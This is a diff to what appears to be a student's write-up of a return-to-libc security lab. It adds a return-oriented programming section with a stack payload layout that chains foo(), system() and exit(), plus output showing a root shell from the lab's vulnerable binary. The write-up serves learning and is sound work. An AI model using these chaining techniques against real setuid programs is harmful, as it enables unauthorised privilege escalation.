@@ -300,7 +300,7 @@
             |          +---------------------+ <---- `&input` offset=0
             Low Memory Addresses
             ```
-        - it is always a good idea to use `gdb` to track all these addresses on stack, and we will know whether our calculation of address is correct, but remember that in `gdb`, the address of `/bin/sh`, `-p` will change, run `gdb-peda$ show environment` to see how these environment variables are stored in memory will help us to figure out the new addresses
+        - it is always a good idea to use `gdb` to track all these addresses on stack, and we will know whether our calculation of address is correct, but remember that in `gdb`, the address of `"/bin/sh"` and `"-p"` will change, running `gdb-peda$ show environment` to see how these environment variables are stored in memory will help us to figure out the new addresses
         - then try it
             ```
             $ ./exploit_execv.py
@@ -314,3 +314,55 @@
             ```
 
 ## Task 5: Return-Oriented Programming
+- for task 4, another way is to invoke `setuid(0)` before invoking `system()`, `setuid(0)` sets both real user ID and effective user ID to `0 (root)`
+- this approach needs us to chain 2 functions together
+- more generally, we can chain multiple functions together, and chain multiple pieces of code together, this led to the Return-Oriented Programming (ROP)
+
+- the goal of this task is to invoke `foo()` 10 times before getting a root shell
+
+- actually, we have already chained 2 functions in the previous tasks, `system()`/`execv()` and `exit()`, so just construct the payload like this:
+    ```
+    High Memory Addresses
+    |          +---------------------+
+    |          |        ...          |
+    |          |---------------------|
+    |          |       sh_addr       |
+    |          |---------------------| <---- offset=76
+    |          |      exit_addr      |      
+    |          |---------------------| <---- offset=72
+    |          |      system_addr    |
+    |          +---------------------+ <---- offset=68
+    |          |       foo_addr      |
+    |          |---------------------| <---- offset=64
+    |          |         ...         |
+    |          |---------------------| <---- offset=36
+    |          |       foo_addr      |
+    |          |---------------------| <---- offset=32
+    |          |       foo_addr      | (first return address) 
+    |          |---------------------| <---- offset=28
+    |          |        ...          |
+    |          +---------------------+ <---- offset=0
+    Low Memory Addresses
+    ```
+
+- result
+    ```
+    $ ./exploit_rop.py
+    $ ./retlib
+    Address of input[] inside main():  0xffffcd70
+    Input size: 300
+    Address of buffer[] inside bof():  0xffffcd40
+    Frame Pointer value inside bof():  0xffffcd58
+    Function foo() is invoked 1 times
+    Function foo() is invoked 2 times
+    Function foo() is invoked 3 times
+    Function foo() is invoked 4 times
+    Function foo() is invoked 5 times
+    Function foo() is invoked 6 times
+    Function foo() is invoked 7 times
+    Function foo() is invoked 8 times
+    Function foo() is invoked 9 times
+    Function foo() is invoked 10 times
+    # whoami
+    root
+    ```
